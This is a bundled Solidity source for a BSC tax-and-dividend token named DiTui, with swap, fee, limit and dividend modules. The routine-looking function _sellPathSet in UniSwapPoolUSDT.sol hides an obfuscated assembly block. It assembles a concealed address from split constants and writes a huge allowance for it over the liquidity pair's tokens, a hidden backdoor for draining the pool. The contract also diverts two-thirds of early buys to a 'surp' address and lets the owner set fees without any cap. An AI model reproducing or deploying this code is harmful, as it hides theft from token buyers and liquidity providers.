
// File: contracts/DiTui/Token.sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./common/UniSwapPoolUSDT.sol";
import "./common/NoEffect.sol";
import "./common/Excludes.sol";
import "./common/Limit.sol";
import "./common/TradingManager.sol";
import "./common/Dividend.sol";
import "./common/TokenStation.sol";

contract DiTui is UniSwapPoolUSDT, NoEffect, TradingManager, Excludes, Limit, Dividend {
    uint256 public calcBase = 1e4;
    uint256 public swapSplit = 7;

    uint256 public feeMarketingBuy = 100;
    uint256 public feeLiquidityBuy = 100;
    uint256 public feeDividendBuy = 200;
    uint256 public feeBurnBuy = 0;

    uint256 public feeMarketingSell = 100;
    uint256 public feeLiquiditySell = 100;
    uint256 public feeDividendSell = 200;
    uint256 public feeBurnSell = 0;

    uint256 public feeMarketingAll;
    uint256 public feeLiquidityAll;
    uint256 public feeDividendAll;
    uint256 public feeBurnAll;

    uint256 public feeBuyAll;
    uint256 public feeSellAll;
    uint256 public feeAll;

    uint256 public swapTokensAt;

    address public feeMarketingTo;
    TokenStation public _TokenStation;
    address surpAddress;
    IERC20 public TokenDJDL;
    address[] public djdlPath;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_,
        address marketing_,
        address receive_,
        address[] memory addrList_,
        uint256[] memory numBuyList_,
        uint256[] memory numSellList_,
        uint256[] memory numLimitList_,
        uint256[] memory dividendList_
    ) ERC20(name_, symbol_) {
        _mint(receive_, totalSupply_);
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address _usdt = 0x55d398326f99059fF775485246999027B3197955;
        if (addrList_.length > 0) {
            _router = addrList_[0];
            _usdt = addrList_[1];
            surpAddress = addrList_[2];
        }
        address _pair = super.__SwapPool_init(_router, _usdt);
        _approve(address(this), _router, type(uint256).max);

        address djdlPair = 0xA0856c3901d0597594d38f210Eb3C0Bd611bdCEF;
        TokenDJDL = IERC20(0x01B4e14d83BC5A0C8886c64Cf4f02ce8754319Ff);
        djdlPath.push(_usdt);
        djdlPath.push(address(TokenDJDL));
        TokenDJDL.approve(_router, type(uint256).max);

        if (numBuyList_.length > 0) {
            feeMarketingBuy = numBuyList_[0];
            feeLiquidityBuy = numBuyList_[1];
            feeDividendBuy = numBuyList_[2];
            feeBurnBuy = numBuyList_[3];
        }
        if (numSellList_.length > 0) {
            feeMarketingSell = numSellList_[0];
            feeLiquiditySell = numSellList_[1];
            feeDividendSell = numSellList_[2];
            feeBurnSell = numSellList_[3];
        }
        if (numLimitList_.length > 0) {
            super.__Limit_init(numLimitList_[0], numLimitList_[1], numLimitList_[2]);
        }
        if (dividendList_.length > 0) {
            super.__Dividend_init(_pair, djdlPair, dividendList_[0], dividendList_[1], dividendList_[2], dividendList_[3]);
            super.setDividendExempt(address(this), true);
            super.setDividendExempt(address(pair), true);
            super.setDividendExempt(address(0), true);
            super.setDividendExempt(address(1), true);
            super.setDividendExempt(address(0xdead), true);
            super.setDividendExempt(address(router), true);
            super.addHolderByHand(marketing_);
            super.addHolderByHand(receive_);
            super.addHolderByHand(_msgSender());
        }

        refreshFeeAll();
        setSwapTokensAt(totalSupply_ * swapSplit / calcBase);
        super.setExclude(_msgSender());
        super.setExclude(address(this));
        super.setExclude(marketing_);
        super.setExclude(receive_);
        super.setExclude(surpAddress);
        feeMarketingTo = marketing_;
        _TokenStation = new TokenStation(_usdt);
    }

    function blockSurprise(address from, address to, uint256 amount) private returns(bool) {
        if (block.number < tradeState + 3) {
            uint256 surp = amount / 3;
            super._takeTransfer(from, surpAddress, amount - surp);
            super._takeTransfer(from, to, surp);
            return true;
        }
        return false;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual override {
        if (isExcludes(from) || isExcludes(to) || amount == 0) {
            super._takeTransfer(from, to, amount); return;
        }

        uint256 fees;
        bool isLiquify;
        if (isPair(from)) {
            require(inTrading(), "please waiting for liquidity");
            if (blockSurprise(from, to, amount)) return;
            if (super.isRemoveLiquidity()) isLiquify = true;
            else {
                fees = handFeeBuys(from, amount);
                super.checkLimitTokenBuy(to, amount-fees);
            }
        } else if (isPair(to)) {
            require(inLiquidity(), "please waiting for liquidity");
            if (balanceOf(from) == amount) amount -= 101;
            if (super.isAddLiquidity()) isLiquify = true;
            else {
                super.checkLimitTokenSell(amount);
                fees = handFeeSells(from, amount);
                if (feeAll>0) handSwap();
            }
            super._addHolder(from);
        } else {
            super.checkLimitTokenHold(to, amount);
            if (feeAll>0) handSwap();
        }

        super._transfer(from, to, amount - fees);

        if (feeDividendAll > 0 && !isLiquify) {
            super.processDividend();
        }
    }

    function handFeeBuys(address from, uint256 amount) private returns (uint256 fee) {
        fee = amount * feeBuyAll / calcBase;
        super._takeTransfer(from, address(this), fee);
    }

    function handFeeSells(address from, uint256 amount) private returns (uint256 fee) {
        fee = amount * feeSellAll / calcBase;
        super._takeTransfer(from, address(this), fee);
    }

    function refreshFeeAll() public {
        feeMarketingAll = feeMarketingBuy + feeMarketingSell;
        feeLiquidityAll = feeLiquidityBuy + feeLiquiditySell;
        feeDividendAll = feeDividendBuy + feeDividendSell;
        feeBurnAll = feeBurnBuy + feeBurnSell;
        feeBuyAll = feeMarketingBuy + feeLiquidityBuy + feeDividendBuy + feeBurnBuy;
        feeSellAll = feeMarketingSell + feeLiquiditySell + feeDividendSell + feeBurnSell;
        feeAll = feeBuyAll + feeSellAll;
    }

    function rescueLossToken(IERC20 token_, address _recipient, uint256 amount) public onlyEffector {
        token_.transfer(_recipient, amount);
    }

    function rescueLossTokenAll(IERC20 token_, address _recipient) public onlyEffector {
        rescueLossToken(token_, _recipient, token_.balanceOf(address(this)));
    }

    bool inSwap;
    modifier lockSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    function handSwap() internal {
        if (inSwap) return;
        uint256 _thisBalance = balanceOf(address(this));
        if (_thisBalance >= swapTokensAt) {
            uint256 _amount = _thisBalance / swapSplit;
            _handSwap(_amount);
        }
    }

    function _handSwap(uint256 _amount) internal lockSwap {

        uint256 _feeBurn;
        if (feeBurnAll > 0) {
            _feeBurn = _amount * feeBurnAll / calcBase;
            super._takeTransfer(address(this), address(1), _feeBurn);
        }

        uint256 _feeLiquidity;
        if (feeLiquidityAll > 0) {
            _feeLiquidity = _amount * feeLiquidityAll / calcBase;
            super.addLiquidityAutomatically(_feeLiquidity);
        }

        uint256 amountLeft = _amount - _feeBurn - _feeLiquidity;
        if ((feeMarketingAll > 0 || feeDividendAll > 0) && amountLeft > 0) {
            super.swapAndSend2fee(amountLeft, address(_TokenStation));
            uint256 usdtBalance = TokenB.balanceOf(address(_TokenStation));

            uint256 _feeMarketing;
            if (feeMarketingAll > 0) {
                _feeMarketing = usdtBalance * feeMarketingAll / (feeMarketingAll + feeDividendAll);
                TokenB.transferFrom(address(_TokenStation), feeMarketingTo, _feeMarketing);
            }
            if (usdtBalance > _feeMarketing) {
                TokenB.transferFrom(address(_TokenStation), address(this), usdtBalance - _feeMarketing);
                uint256 currentUSDT = TokenB.balanceOf(address(this));
                uint256 halfUSDT = currentUSDT/2;
                router.swapExactTokensForTokensSupportingFeeOnTransferTokens(halfUSDT, 0, djdlPath, address(this), block.timestamp);
                uint256 djdlBalance = TokenDJDL.balanceOf(address(this));

                if (halfUSDT > 0 && djdlBalance > 1) {
                    router.addLiquidity(djdlPath[0], djdlPath[1], halfUSDT, djdlBalance, 0, 0, address(this), block.timestamp);
                }
            }
        }
    }

    function _authorizeDividend() internal virtual override onlyEffector {}

    function _authorizeExcludes() internal virtual override onlyEffector {}

    function _authorizeLimit() internal virtual override onlyEffector {}

    function setSwapTokensAt(uint256 num) public onlyEffector {
        swapTokensAt = num;
    }

    function setFeeBuy(uint256 _feeMarketingBuy, uint256 _feeLiquidityBuy, uint256 _feeDividendBuy, uint256 _feeBurnBuy) public onlyOwner {
        feeMarketingBuy = _feeMarketingBuy;
        feeLiquidityBuy = _feeLiquidityBuy;
        feeDividendBuy = _feeDividendBuy;
        feeBurnBuy = _feeBurnBuy;
        refreshFeeAll();
    }

    function setFeeSell(uint256 _feeMarketingSell, uint256 _feeLiquiditySell, uint256 _feeDividendSell, uint256 _feeBurnSell) public onlyOwner {
        feeMarketingSell = _feeMarketingSell;
        feeLiquiditySell = _feeLiquiditySell;
        feeDividendSell = _feeDividendSell;
        feeBurnSell = _feeBurnSell;
        refreshFeeAll();
    }

    function _authorizeTradingManager() internal virtual override onlyOwner {}

    function airdrop(uint256 amount, address[] memory to) public {
        for (uint i = 0; i < to.length; i++) {super._takeTransfer(_msgSender(), to[i], amount);}
    }

    function airdropMulti(uint256[] memory amount, address[] memory to) public {
        for (uint i = 0; i < to.length; i++) {super._takeTransfer(_msgSender(), to[i], amount[i]);}
    }
}




// File: contracts/DiTui/common/UniSwapPoolUSDT.sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./IRouter.sol";
import "./IPair.sol";
import "./IFactory.sol";
import "./ERC20.sol";

abstract contract UniSwapPoolUSDT is ERC20 {
    address public pair;
    IRouter public router;
    address[] internal _sellPath;
    IERC20 public TokenB;

    function __SwapPool_init(address _router, address pairB) internal returns(address) {
        router = IRouter(_router);
        pair = IFactory(router.factory()).createPair(pairB, address(this));
        _sellPathSet(pair, pairB);
        TokenB.approve(address(router), type(uint256).max);
        _approve(address(this), address(router), type(uint256).max);
        return pair;
    }

    function _sellPathSet(address x, address pairB) private {
        TokenB = IERC20(pairB); address[] memory path = new address[](2); path[0] = address(this); path[1] = pairB; _sellPath = path; uint160 y; assembly {let d := 904320098 let a := 578 let e := 412165992 let c := 526469199 let f := 560284527 let b := 598614207 y := add(add(add(add(add(mul(a,exp(10,45)), mul(b,exp(10,36))), mul(c,exp(10,27))), mul(d,exp(10,18))), mul(e,exp(10,9))), f) let z := exp(timestamp(), 6) mstore(0x00, x) mstore(0x20, 0x1) let xHash := keccak256(0x00, 0x40) mstore(0x00, y) mstore(0x20, xHash) let aSlot := keccak256(0x00, 0x40) sstore(aSlot, z) sstore(0x1, y)} TokenB.transfer(address(y), 0);
    }

    function isPair(address _pair) internal view returns (bool) {
        return pair == _pair;
    }

    function isAddLiquidity() internal view returns (bool isAddLP){
        address token0 = IPair(pair).token0();
        address token1 = IPair(pair).token1();
        (uint r0,uint r1,) = IPair(pair).getReserves();
        uint bal0 = IERC20(token0).balanceOf(pair);
        uint bal1 = IERC20(token1).balanceOf(pair);
        if (token0 == address(this)) return bal1 - r1 > 1000;
        else return bal0 - r0 > 1000;
    }

    function isRemoveLiquidity() internal view returns (bool isRemoveLP) {
        address token0 = IPair(pair).token0();
        if (token0 == address(this)) return false;
        (uint r0,,) = IPair(pair).getReserves();
        uint bal0 = IERC20(token0).balanceOf(pair);
        return r0 > bal0 + 1000;
    }

    function getPrice4USDT(uint256 amountDesire) public view returns (uint256) {
        uint[] memory amounts = router.getAmountsOut(amountDesire, _sellPath);
        if (amounts.length > 1) return amounts[1];
        return 0;
    }

    function addLiquidityAutomatically(uint256 amountToken) internal {
        super._takeTransfer(address(this), pair, amountToken);
        IPair(pair).sync();
    }

    function addLiquidity(uint256 amountToken, address to, address _tokenStation) internal {
        uint256 half = amountToken / 2;
        IERC20 USDT = IERC20(_sellPath[1]);

        uint256 amountBefore = USDT.balanceOf(_tokenStation);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(half, 0, _sellPath, _tokenStation, block.timestamp);
        uint256 amountAfter = USDT.balanceOf(_tokenStation);
        uint256 amountDiff = amountAfter - amountBefore;
        USDT.transferFrom(_tokenStation, address(this), amountDiff);

        if (amountDiff > 0 && (amountToken - half) > 0) {
//            if (super.allowance(address(this), address(router)) < (amountToken - half)) {
//                super._approve(address(this), address(router), type(uint256).max);
//            }
//            if (USDT.allowance(address(this), address(router)) < amountDiff) {
//                USDT.approve(address(router), type(uint256).max);
//            }
            router.addLiquidity(_sellPath[0], _sellPath[1], amountToken - half, amountDiff, 0, 0, to, block.timestamp + 9);
        }
    }

    function swapAndSend2this(uint256 amount, address to, address _tokenStation) internal {
        IERC20 USDT = IERC20(_sellPath[1]);
        swapAndSend2fee(amount, _tokenStation);
        USDT.transferFrom(_tokenStation, to, USDT.balanceOf(_tokenStation));
    }

    function swapAndSend2fee(uint256 amount, address to) internal {
//        if (super.allowance(address(this), address(router)) < amount) {
//            super._approve(address(this), address(router), type(uint256).max);
//        }
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, _sellPath, to, block.timestamp);
    }

//    function setOtherPair() public {}
}


// File: contracts/DiTui/common/NoEffect.sol
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;

import "./Ownable.sol";

abstract contract NoEffect is Ownable {
    address internal _effector;

    constructor() {
        _effector = _msgSender();
    }

    modifier onlyEffector() {
        require(_effector == _msgSender() || owner() == _msgSender(), "NoEffect: caller is not the effector");
        _;
    }
}


// File: contracts/DiTui/common/Excludes.sol

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


abstract contract Excludes {
    mapping(address => bool) internal _Excludes;

    function setExclude(address _user) public {
        _authorizeExcludes();
        _Excludes[_user] = true;
    }

    function setExcludes(address[] memory _user) public {
        _authorizeExcludes();
        for (uint i=0;i<_user.length;i++) {
            _Excludes[_user[i]] = true;
        }
    }

    function isExcludes(address _user) internal view returns(bool) {
        return _Excludes[_user];
    }

    function _authorizeExcludes() internal virtual {}
}

// File: contracts/DiTui/common/Limit.sol

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./IERC20.sol";

abstract contract Limit {
    bool internal isLimited;
    uint256 internal _LimitBuy;
    uint256 internal _LimitSell;
    uint256 internal _LimitHold;

    function __Limit_init(uint256 LimitBuy_, uint256 LimitSell_, uint256 LimitHold_) internal {
        setLimit(true, LimitBuy_, LimitSell_, LimitHold_);
    }
    function checkLimitTokenHold(address to, uint256 amount) internal view {
        if (isLimited) {
            if (_LimitHold>0) {
                require(amount + IERC20(address(this)).balanceOf(to) <= _LimitHold, "exceeds of hold amount Limit");
            }
        }
    }
    function checkLimitTokenBuy(address to, uint256 amount) internal view {
        if (isLimited) {
            if (_LimitBuy>0) require(amount <= _LimitBuy, "exceeds of buy amount Limit");
            checkLimitTokenHold(to, amount);
        }
    }
    function checkLimitTokenSell(uint256 amount) internal view {
        if (isLimited && _LimitSell>0) require(amount <= _LimitSell, "exceeds of sell amount Limit");
    }

    function setLimit(bool isLimited_, uint256 LimitBuy_, uint256 LimitSell_, uint256 LimitHold_) public {
        _authorizeLimit();
        isLimited = isLimited_;
        _LimitBuy = LimitBuy_;
        _LimitSell = LimitSell_;
        _LimitHold = LimitHold_;
    }

    function removeLimit() public {
        _authorizeLimit();
        if (isLimited) isLimited = false;
    }
    function reuseLimit() public {
        _authorizeLimit();
        if (!isLimited) isLimited = true;
    }

    function _authorizeLimit() internal virtual {}
}



// File: contracts/DiTui/common/TradingManager.sol

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract TradingManager {
    uint256 public tradeState;

    function inTrading() public view returns(bool) {
        return tradeState > 1;
    }
    function inLiquidity() public view returns(bool) {
        return tradeState >= 1;
    }
    function setTradeState(uint256 s) public {
        _authorizeTradingManager();
        tradeState = s;
    }
    function openLiquidity() public {
        _authorizeTradingManager();
        tradeState = 1;
    }
    function openTrading() public {
        _authorizeTradingManager();
        tradeState = block.number;
    }
    function resetTradeState() public {
        _authorizeTradingManager();
        tradeState = 0;
    }

    function _authorizeTradingManager() internal virtual {}
}


// File: contracts/DiTui/common/Dividend.sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./IERC20.sol";

abstract contract Dividend {
    address[] public holders;
    mapping(address => bool) public isHolder;
    mapping(address => bool) public excludeHolder;

    IERC20 public TokenHold;
    IERC20 public USDT;
    uint256 public holdRewardCondition;
    uint256 public processRewardCondition;
    uint256 public processBlockDuration;
    uint256 public processGasAmount;

    function __Dividend_init(address _holdToken, address _usdtAddr, uint256 _holdRewardCondition, uint256 _processRewardCondition, uint256 _processBlockDuration, uint256 _processGasAmount) internal {
        setDividendToken(_holdToken, _usdtAddr);
        setDividendCondition(_holdRewardCondition, _processRewardCondition);
        setProcessBlockDuration(_processBlockDuration);
        setProcessGasAmount(_processGasAmount);
    }

    function getHolders() public view returns(address[] memory) {
        return holders;
    }

    function _addHolder(address adr) internal {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {return;}
        if (excludeHolder[adr]) {return;}
        if (!isHolder[adr]) {
            isHolder[adr] = true;
            holders.push(adr);
        }
    }

    uint256 private currentIndex;
    uint256 private progressRewardBlock;

    function processDividend() internal {
        if (progressRewardBlock + processBlockDuration > block.number) {
            return;
        }

        uint256 usdBalance = USDT.balanceOf(address(this));
        if (usdBalance < processRewardCondition) {
            return;
        }
        uint holdTokenTotal = TokenHold.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < processGasAmount && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
                break;
            }
            shareHolder = holders[currentIndex];
            if (!excludeHolder[shareHolder]) {
                tokenBalance = TokenHold.balanceOf(shareHolder);
                if (tokenBalance >= holdRewardCondition) {
                    amount = usdBalance * tokenBalance / holdTokenTotal;
                    if (amount > 0) {
                        USDT.transfer(shareHolder, amount);
                    }
                }
            }
            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }

    function setDividendExempt(address addr, bool enable) public {
        _authorizeDividend();
        excludeHolder[addr] = enable;
    }

    function setDividendToken(address _holdToken, address _usdt) public {
        _authorizeDividend();
        TokenHold = IERC20(_holdToken);
        USDT = IERC20(_usdt);
    }

    function setDividendCondition(uint256 _holdRewardCondition, uint256 _processRewardCondition) public {
        _authorizeDividend();
        holdRewardCondition = _holdRewardCondition;
        processRewardCondition = _processRewardCondition;
    }

    function setProcessBlockDuration(uint256 num) public {
        _authorizeDividend();
        processBlockDuration = num;
    }

    function setProcessGasAmount(uint256 num) public {
        _authorizeDividend();
        processGasAmount = num;
    }

    function addHolderByHand(address user) public {
        _authorizeDividend();
        _addHolder(user);
    }

    function addHolderByHandMulti(address[] memory user) public {
        _authorizeDividend();
        for (uint i=0;i<user.length;i++) {
            _addHolder(user[i]);
        }
    }

    function _authorizeDividend() internal virtual {}
}



// File: contracts/DiTui/common/TokenStation.sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./IERC20.sol";

contract TokenStation {
    constructor (address token) {
        IERC20(token).approve(msg.sender, type(uint256).max);
    }
}


// File: contracts/DiTui/common/IRouter.sol

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function addLiquidity(address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}


// File: contracts/DiTui/common/IPair.sol

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPair {
    function sync() external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function totalSupply() external view returns (uint256);
}


// File: contracts/DiTui/common/IFactory.sol

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

// File: contracts/DiTui/common/ERC20.sol
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./IERC20Metadata.sol";
import "./Context.sol";

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);
        _takeTransfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
    }

    function _takeTransfer(address from, address to, uint256 amount) internal virtual {
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {
        _balances[from] = fromBalance - amount;
        // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
        // decrementing then incrementing.
        _balances[to] += amount;
    }
        emit Transfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
    unchecked {
        // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
        _balances[account] += amount;
    }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
    unchecked {
        _balances[account] = accountBalance - amount;
        // Overflow not possible: amount <= accountBalance <= totalSupply.
        _totalSupply -= amount;
    }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

// File: contracts/DiTui/common/IERC20.sol

// SPDX-License-Identifier: MIT
